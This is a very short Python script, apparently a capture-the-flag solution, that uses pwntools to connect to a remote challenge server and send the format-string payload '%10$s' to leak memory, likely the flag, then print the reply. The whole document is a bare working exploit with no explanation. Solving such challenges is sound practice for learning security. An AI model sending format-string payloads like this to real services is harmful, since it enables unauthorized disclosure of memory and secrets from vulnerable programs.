from pwn import remote

r = remote('tjc.tf', 31258)

r.sendline('%10$s')

print(r.recvall().decode())
